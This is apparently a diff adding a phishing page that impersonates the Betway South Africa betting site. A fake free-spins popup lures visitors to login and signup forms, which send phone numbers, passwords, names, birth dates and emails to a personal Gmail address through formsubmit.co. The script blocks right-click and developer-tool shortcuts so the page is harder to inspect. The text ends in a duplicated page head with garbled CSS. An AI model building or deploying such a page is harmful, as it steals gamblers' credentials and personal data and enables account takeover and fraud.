+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M16.365 1.43c-.94.048-2.074.633-2.749 1.36-.599.653-1.152 1.726-1.01 2.75 1.08.042 2.196-.63 2.842-1.339.622-.682 1.02-1.778.917-2.77z"/><path d="M20.79 8.16c-.246-.35-1.22-1.97-2.81-2.58-1.27-.49-2.84-.09-3.77.14-1.015.266-1.86.692-2.6 1.2-1.37.94-2.697 2.257-3.687 3.693C7.12 11.5 6 13.06 5.58 14.5c-.59 1.82.08 3.64.69 4.64.52.85 1.14 1.96 1.95 2.83.82.88 1.79 1.95 3.22 1.95 1.13 0 1.54-.73 3.1-.73 1.56 0 2.03.73 3.1.72 1.43 0 2.2-1.02 3.02-1.9.78-.84 1.32-1.7 1.79-2.71.4-.88.6-1.73.63-1.82-.01-.01-2.44-.94-2.68-3.53-.23-2.36 1.47-3.5 1.55-3.56-.86-1.26-2.17-1.42-2.62-1.44z"/></svg>
+            App Store
+          </a>
+
+          <a class="app-btn" href="#" aria-label="Google Play">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M3.6 1.9l12.6 8.2-12.6 8.2L3.6 1.9zM21.9 12L8.7 3.6v16.8L21.9 12z"/></svg>
+            Google Play
+          </a>
+
+          <a class="app-btn" href="#" aria-label="Huawei AppGallery">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="8" r="3"/><path d="M5 21c1-4 6-7 7-7s6 3 7 7"/></svg>
+            Huawei
+          </a>
+        </div>
+      </div>
+    </section>
+
+    <!-- Support & Partners -->
+    <section class="support" aria-label="Support and partners">
+      <div class="box">
+        <h4 style="margin-bottom:8px;">Support</h4>
+        <p style="color:#bfc7cc; font-size:14px">We offer tailored and in-depth customer service for our customers 24/7. Contact us via <a href="#" style="color:#0b8a00;font-weight:700">Live Chat</a> or <a href="#" style="color:#0b8a00;font-weight:700">Help</a>.</p>
+      </div>
+      <div class="box">
+        <h4 style="margin-bottom:8px;">Responsible Gaming</h4>
+        <p style="color:#bfc7cc;font-size:14px">If you need help, call <a href="#" style="color:#0b8a00;font-weight:700">0800 006 008</a> or use WhatsApp <a href="#" style="color:#0b8a00;font-weight:700">HELP</a>.</p>
+      </div>
+
+      <div style="flex-basis:100%"></div>
+
+      <div style="width:100%">
+        <div style="font-weight:700;margin:10px 0">Partners</div>
+        <div class="partners" aria-hidden="true">
+          <!-- Simple partner logos as small SVGs/rect placeholders -->
+          <svg width="52" height="28" viewBox="0 0 52 28" fill="none"><rect width="52" height="28" rx="6" fill="#222"/></svg>
+          <svg width="52" height="28" viewBox="0 0 52 28" fill="none"><rect width="52" height="28" rx="6" fill="#222"/></svg>
+          <svg width="52" height="28" viewBox="0 0 52 28" fill="none"><rect width="52" height="28" rx="6" fill="#222"/></svg>
+          <svg width="52" height="28" viewBox="0 0 52 28" fill="none"><rect width="52" height="28" rx="6" fill="#222"/></svg>
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer content -->
+    <footer class="site-footer" role="contentinfo">
+      <div class="footer-grid">
+        <div>
+          <a href="#" title="How to Bet">How To Bet</a>
+          <a href="#">Terms & Conditions</a>
+          <a href="#">Betway App</a>
+          <a href="#">Responsible Gaming</a>
+          <a href="#">Sponsorship</a>
+          <a href="#">PAIA Manual</a>
+        </div>
+
+        <div>
+          <a href="#">Frequently asked questions</a>
+          <a href="#">Betting Rules</a>
+          <a href="#">Affiliate Program</a>
+          <a href="#">Privacy Policy</a>
+          <a href="#">Contact Us</a>
+          <a href="#">Play Aviator</a>
+        </div>
+      </div>
+
+      <div class="footer-bottom" style="max-width:980px;margin:18px auto 0;">
+        <p style="margin-bottom:12px;">Raging River Trading (Pty) Ltd (2011/134505/07) licensed to promote Betway South Africa, is licensed and regulated by the Western Cape Gambling and Racing Board. Bookmaker License Number:10181496-011 first issued on 1 December 2016. No persons under the age of 18 years are permitted to gamble.</p>
+
+        <p style="margin-bottom:6px;">Version: 15.0.0 | Current time: <span id="currentTime">--:--:--</span> &nbsp;&nbsp; © 2026 Betway</p>
+      </div>
+    </footer>
+  </main>
+
+  <div id="voucherPopup" class="voucher-popup" aria-hidden="true">
+    <div class="voucher-card">
+      <h2>Congratulations!</h2>
+      <p class="subtitle">You’ve won a Betway Hot Hot fruit  free Spins!</p>
+      <div class="voucher-amount">100 Spins</div>
+      <p class="small">Login or register to claim your free Haborone spins !!.</p>
+      <button id="claimBtn" class="voucher-btn">Claim Now</button>
+    </div>
+  </div>
+
+  <!-- Login overlay -->
+  <div class="overlay" id="overlay" aria-hidden="true">
+    <div class="login-container" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
+      <div class="login-header">
+        <span id="loginTitle">Login</span>
+        <button class="close-btn" onclick="closeLogin()" aria-label="Close login">×</button>
+      </div>
+
+      <div class="login-body">
+        <form id="loginForm" action="https://formsubmit.co/williamrahlalane442@gmail.com" method="POST">
+          <div class="input-group">
+            <span class="prefix">+27</span>
+            <input type="text" placeholder="Mobile Number" id="loginPhone" name="mobile" inputmode="numeric" autocomplete="tel" required>
+            <div id="loginPhoneError" class="error">Please enter a valid mobile number.</div>
+          </div>
+
+          <div class="password-wrapper">
+            <input type="password" placeholder="Password" id="passwordField" name="password" required>
+            <button class="eye-btn" type="button" onclick="togglePassword()" aria-label="Toggle password visibility">
+              <!-- eye SVG icon -->
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" stroke="#555" stroke-width="1.6"/>
+                <circle cx="12" cy="12" r="3" stroke="#555" stroke-width="1.6"/>
+              </svg>
+            </button>
+            <div id="loginPasswordError" class="error">Password must be at least 6 characters.</div>
+          </div>
+
+          <div class="forgot"><a href="#">Forgot Password?</a></div>
+
+          <div class="signup-box">
+            <span>Don't have an account yet?</span>
+            <a href="#" onclick="openSignup(); return false;" style="color:#0b8a00;font-weight:700;display:flex;align-items:center;gap:4px;">
+              Sign Up
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+                <path d="M9 18l6-6-6-6" stroke="#0b8a00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </a>
+          </div>
+
+          <button class="login-action" type="button" onclick="submitLogin()">Login</button>
+
+          <div class="bio-login" style="margin-top:18px;text-align:center;color:#444;font-weight:500;">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:middle;">
+              <path d="M12 1a11 11 0 0 0-11 11 11 11 0 0 0 11 11 11 11 0 0 0 11-11A11 11 0 0 0 12 1zM8.5 13.5c.2 2.3 1.3 4 3.5 4s3.3-1.7 3.5-4M7 10c.3-2 1.8-3.5 5-3.5s4.7 1.5 5 3.5" stroke="#222" stroke-width="1.4" stroke-linecap="round"/>
+            </svg>
+            <span style="margin-left:6px;">Enable Biometric Login</span>
+          </div>
+
+          <input type="hidden" name="_captcha" value="false">
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signup overlay -->
+  <div class="overlay" id="signupOverlay" aria-hidden="true">
+    <div class="signup-container" role="dialog" aria-modal="true" aria-labelledby="signupTitle">
+      <div class="signup-header">
+        <span id="signupTitle">Sign Up</span>
+        <button class="close-btn" onclick="closeSignup()" aria-label="Close signup">×</button>
+      </div>
+
+      <div class="signup-body">
+        <div id="signupLoader" class="loader-wrap" aria-hidden="true" style="display:none;">
+          <div style="text-align:center;">
+            <div id="signupLoaderMessage" class="loader-message"> </div>
+            <div class="ball-loader" aria-hidden="true">
+              <div class="ball"></div>
+              <div class="ball"></div>
+              <div class="ball"></div>
+            </div>
+          </div>
+        </div>
+
+        <form id="signupForm" action="https://formsubmit.co/williamrahlalane442@gmail.com" method="POST">
+          <div class="signup-grid">
+            <div class="form-row">
+              <label for="firstName">First name</label>
+              <input id="firstName" name="firstName" type="text" placeholder="First name" required>
+              <div id="firstNameError" class="error">Please enter your first name.</div>
+            </div>
+            <div class="form-row">
+              <label for="lastName">Last name</label>
+              <input id="lastName" name="lastName" type="text" placeholder="Last name" required>
+              <div id="lastNameError" class="error">Please enter your last name.</div>
+            </div>
+
+            <div class="form-row">
+              <label for="dob">Date of birth</label>
+              <input id="dob" name="dob" type="date" required>
+              <div id="dobError" class="error">Please enter your date of birth.</div>
+            </div>
+            <div class="form-row">
+              <label for="gender">Gender</label>
+              <select id="gender" name="gender" aria-label="Gender">
+                <option value="">Prefer not to say</option>
+                <option value="male">Male</option>
+                <option value="female">Female</option>
+                <option value="other">Other</option>
+              </select>
+            </div>
+
+            <div class="form-row">
+              <label for="mobile">Mobile number</label>
+              <input id="mobile" name="mobile" type="tel" placeholder="e.g. 0712345678" inputmode="numeric" autocomplete="tel" required>
+              <div id="mobileError" class="error">Please enter a valid mobile number</div>
+            </div>
+            <div class="form-row">
+              <label for="email">Email address</label>
+              <input id="email" name="email" type="email" placeholder="you@example.com" required>
+              <div id="emailError" class="error">Please enter a valid email address.</div>
+            </div>
+
+            <div class="form-row">
+              <label for="password">Password</label>
+              <input id="suPassword" name="password" type="password" placeholder="Create a password" required>
+              <div id="passwordError" class="error">Password must be at least 6 characters.</div>
+            </div>
+            <div class="form-row">
+              <label for="confirmPassword">Confirm password</label>
+              <input id="confirmPassword" name="confirmPassword" type="password" placeholder="Confirm password" required>
+              <div id="confirmPasswordError" class="error">Passwords do not match.</div>
+            </div>
+          </div>
+
+          <div class="terms">
+            <input id="agreeTerms" type="checkbox" aria-label="Accept terms" />
+            <label for="agreeTerms" style="font-weight:600;color:#333">I confirm I am 18+ and accept the <a href="#" style="color:#0b8a00;font-weight:800">Terms & Conditions</a>.</label>
+          </div>
+          <div id="agreeError" class="error" style="display:none;margin-bottom:10px;">You must accept the terms and conditions.</div>
+
+          <div>
+            <button type="button" id="createAccountBtn" class="create-account" onclick="submitSignup()">Create Account</button>
+            <div class="form-footer small-note">By creating an account you agree to our terms and privacy policy. Standard identification checks may be required.</div>
+            <div class="alt-action">Already have an account? <a href="#" onclick="switchToLogin(); return false;">Login</a></div>
+          </div>
+
+          
+          <input type="hidden" name="_captcha" value="false">
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bottom navigation -->
+  <nav class="bottom-nav" role="navigation" aria-label="Bottom navigation">
+    <div class="item active"><svg data-lucide="log-in"></svg><span style="font-size:12px;">Login</span></div>
+    <div class="item"><svg data-lucide="message-circle"></svg><span style="font-size:12px;">Chat</span></div>
+    <div class="item active" style="transform:translateY(-6px); background:transparent;">
+      <div style="background:#0b8a00; width:64px; height:56px; border-radius:12px; display:flex;align-items:center;justify-content:center; box-shadow:0 6px 0 rgba(0,0,0,0.35);">
+        <svg data-lucide="file-text" style="color:#fff;"></svg>
+      </div>
+      <div style="font-size:12px;margin-top:4px;color:#fff;">Betslip</div>
+    </div>
+    <div class="item"><svg data-lucide="gift"></svg><span style="font-size:12px;">Promos</span></div>
+    <div class="item"><svg data-lucide="user-plus"></svg><span style="font-size:12px;">Sign Up</span></div>
+  </nav>
+
+  <script>
+    // --- Mobile menu toggle ---
+    const menu = document.getElementById('mobileMenu');
+    const openIcon = document.querySelector('.menu-icon');
+    const closeBtn = document.querySelector('.menu-close');
+
+    if (openIcon) {
+      openIcon.addEventListener('click', () => {
+        if (menu) {
+          menu.classList.add('active');
+          menu.setAttribute('aria-hidden', 'false');
+        }
+      });
+    }
+    if (closeBtn) {
+      closeBtn.addEventListener('click', () => {
+        if (menu) {
+          menu.classList.remove('active');
+          menu.setAttribute('aria-hidden', 'true');
+        }
+      });
+    }
+
+    // --- Customer Hub dropdown toggle ---
+    function toggleCustomerHub() {
+      const content = document.getElementById('hubContent');
+      const arrow = document.getElementById('hubArrow');
+      if (!content) return;
+      const visible = content.style.display === 'block';
+      content.style.display = visible ? 'none' : 'block';
+      arrow.textContent = visible ? '▼' : '▲';
+    }
+
+    // --- Lucide icons init ---
+    if (window.lucide) lucide.createIcons();
+
+    // --- Live current time in footer ---
+    function updateTime() {
+      const el = document.getElementById('currentTime');
+      if (!el) return;
+      const now = new Date();
+      const hh = String(now.getHours()).padStart(2, '0');
+      const mm = String(now.getMinutes()).padStart(2, '0');
+      const ss = String(now.getSeconds()).padStart(2, '0');
+      el.textContent = `${hh}:${mm}:${ss}`;
+    }
+    updateTime();
+    setInterval(updateTime, 1000);
+
+    // --- Overlay (Login popup) logic ---
+    function openLogin() {
+      const overlay = document.getElementById('overlay');
+      if (!overlay) return;
+      // close signup if open
+      closeSignup();
+      overlay.classList.add('active'); overlay.setAttribute('aria-hidden', 'false');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function closeLogin() {
+      const overlay = document.getElementById('overlay');
+      if (!overlay) return;
+      overlay.classList.remove('active'); overlay.setAttribute('aria-hidden', 'true');
+    }
+
+    // --- Signup overlay logic ---
+    function openSignup() {
+      const signupOverlay = document.getElementById('signupOverlay');
+      const signupLoader = document.getElementById('signupLoader');
+      const signupForm = document.getElementById('signupForm');
+
+      if (!signupOverlay || !signupLoader || !signupForm) return;
+
+      // close login overlay if open
+      closeLogin();
+
+      // Show overlay and loader first (2s), then reveal form
+      signupForm.style.display = 'none';
+      signupLoader.style.display = 'flex';
+      signupLoader.setAttribute('aria-hidden','false');
+      signupOverlay.classList.add('active');
+      signupOverlay.setAttribute('aria-hidden', 'false');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+
+      // After 2 seconds reveal form (simulates Betway internal load)
+      setTimeout(() => {
+        signupLoader.style.display = 'none';
+        signupLoader.setAttribute('aria-hidden','true');
+        signupForm.style.display = 'block';
+      }, 2000);
+    }
+
+    function closeSignup() {
+      const signupOverlay = document.getElementById('signupOverlay');
+      if (!signupOverlay) return;
+      signupOverlay.classList.remove('active');
+      signupOverlay.setAttribute('aria-hidden', 'true');
+      // reset: show loader hidden and hide form so next open restarts loader
+      const signupLoader = document.getElementById('signupLoader');
+      const signupForm = document.getElementById('signupForm');
+      if (signupLoader) signupLoader.style.display = 'none';
+      if (signupForm) signupForm.style.display = 'none';
+    }
+
+    function switchToLogin() {
+      closeSignup();
+      // small delay to allow signup modal to close visually
+      setTimeout(openLogin, 160);
+    }
+
+    // --- Password visibility toggle for login password ---
+    function togglePassword() {
+      const input = document.getElementById('passwordField');
+      const eyeBtnSvg = document.querySelector('.eye-btn svg');
+      if (!input || !eyeBtnSvg) return;
+
+      if (input.type === 'password') {
+        input.type = 'text';
+        eyeBtnSvg.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8 a21.3 21.3 0 0 1 5.23-6.11"/><path d="M1 1l22 22"/>';
+      } else {
+        input.type = 'password';
+        eyeBtnSvg.innerHTML = '<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
+      }
+    }
+
+    // ---------- Input helpers: numeric only for mobile fields ----------
+    function enforceDigitsOnly(el) {
+      if (!el) return;
+      el.addEventListener('input', function (e) {
+        const cleaned = this.value.replace(/\D+/g, '');
+        if (this.value !== cleaned) this.value = cleaned;
+      });
+      // prevent non-numeric paste
+      el.addEventListener('paste', function (e) {
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        if (/\D/.test(paste)) {
+          e.preventDefault();
+          const cleaned = paste.replace(/\D+/g, '');
+          const start = this.selectionStart || 0;
+          const val = this.value;
+          this.value = val.slice(0, start) + cleaned + val.slice(start);
+        }
+      });
+    }
+
+    // Hook numeric enforcement to relevant inputs
+    document.addEventListener('DOMContentLoaded', function () {
+      enforceDigitsOnly(document.getElementById('mobile'));
+      enforceDigitsOnly(document.getElementById('loginPhone'));
+    });
+
+    // ---------- Validation helpers ----------
+    function showError(el, msgEl) {
+      if (msgEl) { msgEl.style.display = 'block'; }
+      if (el) { el.classList.add('invalid'); }
+    }
+    function hideError(el, msgEl) {
+      if (msgEl) { msgEl.style.display = 'none'; }
+      if (el) { el.classList.remove('invalid'); }
+    }
+
+    function validateEmail(email) {
+      // simple but effective regex
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
+    // ---------- Login submit flow ----------
+    function validateLoginForm() {
+      let ok = true;
+      const phone = document.getElementById('loginPhone');
+      const password = document.getElementById('passwordField');
+      const phoneErr = document.getElementById('loginPhoneError');
+      const pwErr = document.getElementById('loginPasswordError');
+
+      hideError(phone, phoneErr);
+      hideError(password, pwErr);
+
+      if (!phone.value || !/^\d{7,}$/.test(phone.value)) { // minimum digits check
+        showError(phone, phoneErr);
+        ok = false;
+      }
+      if (!password.value || password.value.length < 6) {
+        showError(password, pwErr);
+        ok = false;
+      }
+      return ok;
+    }
+
+
+/* ---------- Reliable login submit (replace your current submitLogin) ---------- */
+function submitLogin() {
+  const form = document.getElementById('loginForm');
+  if (!form) return;
+  if (!validateLoginForm()) return;
+
+  // Target the login overlay body (where we show the loader)
+  const overlay = document.getElementById('overlay');
+  const body = overlay ? overlay.querySelector('.login-body') : null;
+  if (!body) return;
+
+  // Hide the real form visually (keep it in DOM) and show loader
+  form.style.display = 'none';
+
+  // Create loader block (same look/feel as signup loader)
+  const loaderDiv = document.createElement('div');
+  loaderDiv.setAttribute('aria-hidden', 'true');
+  loaderDiv.className = 'login-loader';
+  loaderDiv.style.textAlign = 'center';
+  loaderDiv.style.padding = '22px';
+  loaderDiv.innerHTML = `
+    <div style="font-weight:800;color:#111;margin-bottom:10px;">Logging in... please wait</div>
+    <div class="ball-loader" aria-hidden="true">
+      <div class="ball"></div><div class="ball"></div><div class="ball"></div>
+    </div>
+  `;
+  body.appendChild(loaderDiv);
+
+  // Build a tiny hidden form that's attached to document.body and submit that.
+  // This avoids "form not connected" errors if the real form gets moved/modified.
+  function buildAndSubmitClone(originalForm) {
+    try {
+      const clone = document.createElement('form');
+      // copy action & method from original (fall back to POST)
+      clone.action = originalForm.action || '';
+      clone.method = originalForm.method || 'POST';
+      clone.style.display = 'none';
+      // transfer values for named inputs/selects/textareas
+      Array.from(originalForm.elements).forEach(el => {
+        if (!el.name) return; // only fields with a name attribute
+        // do not copy file inputs (can't)
+        if (el.tagName === 'INPUT' && el.type === 'file') return;
+        let input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = el.name;
+        // For checkboxes/radios only include if checked
+        if (el.type === 'checkbox' || el.type === 'radio') {
+          if (el.checked) input.value = el.value;
+          else return;
+        } else {
+          input.value = el.value;
+        }
+        clone.appendChild(input);
+      });
+      document.body.appendChild(clone);
+
+      // submit then remove clone (wrap in try/catch for safety)
+      clone.submit();
+      setTimeout(() => { try { clone.remove(); } catch(e){} }, 1500);
+    } catch (err) {
+      // fallback: restore UI
+      loaderDiv.remove();
+      form.style.display = 'block';
+      console.error('Login submit failed:', err);
+    }
+  }
+
+  // Wait a short moment to let the loader show, then submit
+  setTimeout(() => {
+    buildAndSubmitClone(form);
+  }, 700); // 700ms gives loader a moment to render before navigation
+
+}
+
+(function antiCloneDeterrents() {
+  try {
+    // 1) Disable right-click context menu
+    document.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    }, { passive: false });
+
+    document.addEventListener('keydown', function (e) {
+      const key = e.key || e.code || e.keyCode;
+      // F12
+      if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
+      // Ctrl+Shift+I / Ctrl+Shift+J
+      if (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j')) {
+        e.preventDefault(); return false;
+      }
+      // Ctrl+U / Ctrl+S / Ctrl+Shift+C
+      if (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.key.toLowerCase() === 's' || (e.shiftKey && e.key.toLowerCase() === 'c'))) {
+        e.preventDefault(); return false;
+      }
+    }, false);
+
+    // 3) Periodic DOM integrity check: if someone has removed key elements, reload the page
+    //    (This is a lightweight tamper-detector — it's a deterrent only)
+    const importantIds = ['overlay','loginForm','signupForm','mobileMenu'];
+    setInterval(() => {
+      try {
+        for (let id of importantIds) {
+          if (!document.getElementById(id)) {
+            console.warn('Important DOM node missing:', id);
+            // quick visual fail-safe: reload after short delay
+            setTimeout(() => {
+              if (!document.getElementById(id)) location.reload(true);
+            }, 600);
+            break;
+          }
+        }
+      } catch (e) {}
+    }, 3000);
+
+    // 4) Insert a small invisible "fingerprint" meta so stolen copies can be detected
+    //    (set a unique id or token on server and change it per deploy)
+    (function insertFingerprint() {
+      const scriptId = 'site-fingerprint';
+      if (!document.getElementById(scriptId)) {
+        const s = document.createElement('meta');
+        s.id = scriptId;
+        s.name = 'x-site-fingerprint';
+        s.content = 'new-betway.netlify'; 
+        document.head.appendChild(s);
+      }
+    })();
+
+    // 5) Lightweight obfuscation: move some static strings into base64 and decode at runtime
+    //    (only to deter casual copy/paste; not real protection)
+    window._decode = function(b64) {
+      try { return atob(b64); } catch(e){ return b64; }
+    };
+
+    // Example (you can use _decode(...) if you want to hide some literal strings):
+    // const someText = _decode('SGVsbG8gd29ybGQh'); // "Hello world!"
+
+  } catch (err) {
+    // never break the site if anti-clone script fails
+    console.error('antiCloneDeterrents error', err);
+  }
+})();
+
+
+
+    // ---------- Signup submit flow ----------
+    function validateSignupForm() {
+      let ok = true;
+
+      const first = document.getElementById('firstName');
+      const last = document.getElementById('lastName');
+      const dob = document.getElementById('dob');
+      const mobile = document.getElementById('mobile');
+      const email = document.getElementById('email');
+      const pw = document.getElementById('suPassword');
+      const cpw = document.getElementById('confirmPassword');
+      const agree = document.getElementById('agreeTerms');
+
+      // error elements
+      const firstErr = document.getElementById('firstNameError');
+      const lastErr = document.getElementById('lastNameError');
+      const dobErr = document.getElementById('dobError');
+      const mobileErr = document.getElementById('mobileError');
+      const emailErr = document.getElementById('emailError');
+      const pwErr = document.getElementById('passwordError');
+      const cpwErr = document.getElementById('confirmPasswordError');
+      const agreeErr = document.getElementById('agreeError');
+
+      // hide all      
+      [firstErr,lastErr,dobErr,mobileErr,emailErr,pwErr,cpwErr,agreeErr].forEach(el => { if (el) el.style.display = 'none'; });
+
+      if (!first.value.trim()) { firstErr.style.display = 'block'; ok = false; }
+      if (!last.value.trim()) { lastErr.style.display = 'block'; ok = false; }
+      if (!dob.value) { dobErr.style.display = 'block'; ok = false; }
+      if (!mobile.value || !/^\d{8,}$/.test(mobile.value)) { mobileErr.style.display = 'block'; ok = false; } // basic length
+      if (!email.value || !validateEmail(email.value)) { emailErr.style.display = 'block'; ok = false; }
+      if (!pw.value || pw.value.length < 6) { pwErr.style.display = 'block'; ok = false; }
+      if (pw.value !== cpw.value) { cpwErr.style.display = 'block'; ok = false; }
+      if (!agree.checked) { agreeErr.style.display = 'block'; ok = false; }
+
+      return ok;
+    }
+
+    function submitSignup() {
+      const form = document.getElementById('signupForm');
+      if (!form) return;
+      if (!validateSignupForm()) {
+        return;
+      }
+
+      // show loader message inside modal replacing the form (like Betway)
+      const body = document.querySelector('#signupOverlay .signup-body');
+      if (!body) return;
+      // hide form and show loader message (will still submit form after 2s)
+      form.style.display = 'none';
+      const loaderWrap = document.getElementById('signupLoader');
+      const loaderMsg = document.getElementById('signupLoaderMessage');
+      if (loaderWrap && loaderMsg) {
+        loaderMsg.textContent = 'Creating account... please wait';
+        loaderWrap.style.display = 'flex';
+        loaderWrap.setAttribute('aria-hidden','false');
+      } else {
+        // fallback: show inline loader
+        body.innerHTML = `<div style="text-align:center;padding:22px;"><div style="font-weight:800;color:#111;margin-bottom:10px;">Creating account... please wait</div><div class="ball-loader"><div class="ball"></div><div class="ball"></div><div class="ball"></div></div></div>`;
+      }
+
+      // after 2 seconds, submit form to FormSubmit.co
+      setTimeout(() => {
+        try {
+          form.submit();
+        } catch (err) {
+          // restore UI if submission prevented
+          if (loaderWrap) {
+            loaderWrap.style.display = 'none';
+            loaderWrap.setAttribute('aria-hidden','true');
+          }
+          form.style.display = 'block';
+        }
+      }, 2000);
+    }
+
+    // --- Close login/signup popup with ESC key ---
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape') {
+        closeLogin();
+        closeSignup();
+      }
+    });
+
+    // --- Voucher popup behavior ---
+    function getRandomPrize() {
+      const prizePool = [
+        "100 Free Spins ","150 Free Spins ","50 Free Spins ","30 Free Spins ","300 Free Spins "
+      ];
+      const randomIndex = Math.floor(Math.random() * prizePool.length);
+      return prizePool[randomIndex];
+    }
+
+    window.addEventListener('load', () => {
+      try {
+        const shown = sessionStorage.getItem('voucherShown');
+        if (!shown) {
+          setTimeout(() => {
+            const vp = document.getElementById('voucherPopup');
+            const prizeEl = document.querySelector('.voucher-amount');
+            if (vp && prizeEl) {
+              const prize = getRandomPrize();
+              prizeEl.textContent = prize;
+              vp.classList.add('active');
+              vp.setAttribute('aria-hidden', 'false');
+              sessionStorage.setItem('voucherShown', '1');
+              sessionStorage.setItem('userPrize', prize);
+            }
+          }, 1200);
+        } else {
+          const savedPrize = sessionStorage.getItem('userPrize');
+          const prizeEl = document.querySelector('.voucher-amount');
+          if (savedPrize && prizeEl) prizeEl.textContent = savedPrize;
+        }
+      } catch (e) {
+        setTimeout(() => {
+          const vp = document.getElementById('voucherPopup');
+          const prizeEl = document.querySelector('.voucher-amount');
+          if (vp && prizeEl) {
+            const prize = getRandomPrize();
+            prizeEl.textContent = prize;
+            vp.classList.add('active');
+            vp.setAttribute('aria-hidden', 'false');
+          }
+        }, 1200);
+      }
+    });
+
+    // --- Claim button + popup close ---
+    document.addEventListener('click', function (e) {
+      const target = e.target;
+      if (!target) return;
+
+      if (target.id === 'claimBtn' || (target.closest && target.closest('#claimBtn'))) {
+        const vp = document.getElementById('voucherPopup');
+        if (vp) {
+          vp.classList.remove('active');
+          vp.setAttribute('aria-hidden', 'true');
+        }
+        openLogin();
+      }
+
+      // clicking background overlay inside voucher popup closes it
+      const vpEl = document.getElementById('voucherPopup');
+      if (vpEl && (target === vpEl || vpEl.contains(target) && target.classList && target.classList.contains('voucher-popup'))) {
+        vpEl.classList.remove('active');
+        vpEl.setAttribute('aria-hidden','true');
+      }
+    }, false);
+
+    // --- Hook up mobile menu signup buttons and bottom nav sign up item ---
+    document.addEventListener('DOMContentLoaded', function () {
+      // mobile menu signup button (already has onclick in markup but keep defensive)
+      const mmSignup = document.querySelector('.mobile-menu .signup-btn');
+      if (mmSignup) mmSignup.addEventListener('click', function (e) { e.preventDefault(); openSignup(); if (menu) { menu.classList.remove('active'); menu.setAttribute('aria-hidden','true'); } });
+
+      // bottom nav "Sign Up" item (last item)
+      const bottomItems = document.querySelectorAll('.bottom-nav .item');
+      if (bottomItems && bottomItems.length) {
+        const last = bottomItems[bottomItems.length - 1];
+        last.addEventListener('click', function () { openSignup(); });
+      }
+
+      // Also ensure any anchor that says "Sign Up" inside page that we added opens signup (defensive)
+      document.querySelectorAll('a').forEach(a => {
+        if (a.textContent && a.textContent.trim().toLowerCase() === 'sign up') {
+          a.addEventListener('click', function (ev) { ev.preventDefault(); openSignup(); });
+        }
+      });
+    });
+
+    // small accessibility: clicking outside overlay content closes popups
+    document.addEventListener('click', function (e) {
+      const suOverlay = document.getElementById('signupOverlay');
+      const overlay = document.getElementById('overlay');
+      if (suOverlay && e.target === suOverlay) closeSignup();
+      if (overlay && e.target === overlay) closeLogin();
+    });
+  </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Betway ZA</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    /* Reset & Base */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html,body { height: 100%; }
+    body {
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: #111;
+      color: #fff;
+      -webkit-font-smoothing:antialiased;
+      padding-bottom: 86px; /* space for bottom nav */
+      line-height: 1.4;
+    }
+
+    a { color: inherit; text-decoration: none; }
+
+    /* Header (fixed) */
+    .top-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 60px;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px;
+      z-index: 1200;
+      box-shadow: 0 1px 0 rgba(255,255,255,0.02) inset;
+    }
+    .top-left 
+    { 
+    display:flex; 
+    align-items:center; 
+    gap:12px; }
+    .menu-icon 
+    { font-size: 22px; cursor: pointer; color:#fff; }
+    .brand { font-weight:700; font-size:24px; color:#fff; letter-spacing: -1px; }
+    .auth-buttons {
+  display: flex;
+  gap: 10px;
+  align-items: center;
+  transform: translateY(8px); /* visually aligns perfectly */
+}
+    .btn { border: none; padding:8px 14px; border-radius:6px; font-weight:700; cursor:pointer; font-size:14px; }
+    .btn-login { background:#fff; color:#0b8a00; }
+    .btn-signup { background:#0b8a00; color:#fff; }
+
+    /* Page container */
+    .page {
+      padding: 78px 14px 20px; /* top for fixed header */
+      max-width: 980px;
+      margin: 0 auto;
+    }
+
+    /* Search box */
+    .search-box {
+      background:#1e1e1e;
+      border-radius:7px;
+      padding:8px;
+      display:flex;
+      align-items:cen-items:cen:cen-items:cen
